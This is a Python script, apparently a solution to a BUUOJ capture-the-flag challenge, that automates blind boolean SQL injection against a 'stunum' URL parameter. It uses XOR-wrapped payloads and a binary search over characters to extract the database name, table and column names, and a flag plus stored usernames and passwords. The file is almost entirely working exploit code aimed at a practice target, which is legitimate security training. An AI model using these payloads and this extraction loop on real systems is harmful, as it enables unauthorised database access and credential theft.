import requests
# from urllib.parse import urljoin

url = 'http://f210451a-de8e-436c-9de2-4289b90198af.node5.buuoj.cn:81/?stunum='

def judge_database():
    """ 获取数据库长度 """
    for i in range(20):
        tmp_url = f"{url}0^(length(database())={i})"
        resp = requests.get(tmp_url, timeout=8)
        if "your score is: 100" in resp.text:
            print(f"Database length is: {i}")
            break
        print(f"try 0^(length(database())={i})")
        
        
def get_database():
    """ 获取数据库名 """
    database = ''
    for i in range(1, 5): # 因为数据库长度为4
        low = 32
        high = 128
        mid = (low + high) // 2
        while low < high:
            tmp_url = f"{url}0^(ord(substr(database(),{i},1))<{mid})"
            # print(tmp_url, low, high)
            resp = requests.get(tmp_url, timeout=8)
            if "your score is: 100" in resp.text:
                high = mid
            else:
                low = mid + 1
            mid = (low + high) // 2
        if mid <= 32 or mid >= 127:
            break
        database += chr(mid - 1)
    print(f"Database is: {database}")
    
    
def get_tables_length(table_schema='ctf'):
    """ 获取表名长度 """
    for i in range(20):
        tmp_url = f"{url}0^((select(length(group_concat(table_name)))from(information_schema.tables)where(table_schema='{table_schema}'))={i})"
        print(tmp_url)
        resp = requests.get(tmp_url, timeout=8)
        if "your score is: 100" in resp.text:
            print(f"Table length is: {i}")
            break
        
def get_tables(table_schema='ctf', table_length=10):
    """ 获取表名 """
    tables = ''
    for i in range(1, table_length + 1): # 因为表长度为16
        low = 32
        high = 128
        mid = (low + high) // 2
        while low < high:
            tmp_url = f"{url}0^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='{table_schema}')),{i},1))<{mid})"
            # print(tmp_url, low, high)
            resp = requests.get(tmp_url, timeout=8)
            if "your score is: 100" in resp.text:
                high = mid
            else:
                low = mid + 1
            mid = (low + high) // 2
        if mid <= 32 or mid >= 127:
            break
        tables += chr(mid - 1)
        print(tables)
    print(f"Tables is: {tables}")
    
    
def get_column_length(table_name='flag', column_length=300):
    """ 判断列名长度 """
    for i in range(column_length + 1):
        tmp_url = f"{url}0^((select(length(group_concat(column_name)))from(information_schema.columns)where(table_name='{table_name}'))={i})"
        print(tmp_url)
        resp = requests.get(tmp_url, timeout=8)
        if "your score is: 100" in resp.text:
            print(f"Column length is: {i}")
            break
        
        
def get_columns_name(table_name='flag', column_length=10):
    """ 获取列名 """
    columns = ''
    for i in range(1, column_length + 1): # 因为表长度为16
        low = 32
        high = 128
        mid = (low + high) // 2
        while low < high:
            tmp_url = f"{url}0^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='{table_name}')),{i},1))<{mid})"
            # print(tmp_url, low, high)
            resp = requests.get(tmp_url, timeout=8)
            if "your score is: 100" in resp.text:
                high = mid
            else:
                low = mid + 1
            mid = (low + high) // 2
        if mid <= 32 or mid >= 127:
            break
        columns += chr(mid - 1)
        print(columns)
    print(f"Column is: {columns}")
    
def get_flag_value(table_name='flag', column_name='value', value_length=300):
    column_values = ''
    for i in range(1, value_length + 1): # 因为表长度为16
        low = 32
        high = 128
        mid = (low + high) // 2
        while low < high:
            tmp_url = f"{url}0^(ord(substr((select(group_concat({column_name}))from({table_name})),{i},1))<{mid})"
            # print(tmp_url, low, high)
            resp = requests.get(tmp_url, timeout=8)
            if "your score is: 100" in resp.text:
                high = mid
            else:
                low = mid + 1
            mid = (low + high) // 2
        if mid <= 32 or mid >= 127:
            break
        column_values += chr(mid - 1)
        print(column_values)
    print(f"value is: {column_values}")
    
    
def get_all_column_length(column_name='password', table_name='F1naI1y', column_length=300):
    """ 获取列长度 """
    for i in range(column_length + 1):
        tmp_url = f"{url}0^((select(length(group_concat({column_name})))from({table_name}))={i})"
        print(tmp_url)
        resp = requests.get(tmp_url, timeout=8)
        if "your score is: 100" in resp.text:
            print(f"All Column length is: {i}")
            break
    
def get_final_flag_value():
    column_values = ''
    for i in range(1, 300):
        low = 32
        high = 128
        mid = (low + high) // 2
        while low < high:
            tmp_url = f"{url}0^(ord(substr((select(group_concat(username,password))from(F1naI1y)),{i},1))<{mid})"
            print(tmp_url, low, high)
            resp = requests.get(tmp_url, timeout=8)
            if "your score is: 100" in resp.text:
                high = mid
            else:
                low = mid + 1
            mid = (low + high) // 2
        if mid <= 32 or mid >= 127:
            break
        column_values += chr(mid - 1)
        print(column_values)
    print(f"value is: {column_values}")
    
    
if __name__ == '__main__':
    # judge_database()
    # get_database()
    # get_tables_length()
    # get_tables()
    # get_column_length()
    # get_columns_name()
    get_flag_value()  # 没在那个表里 重新查表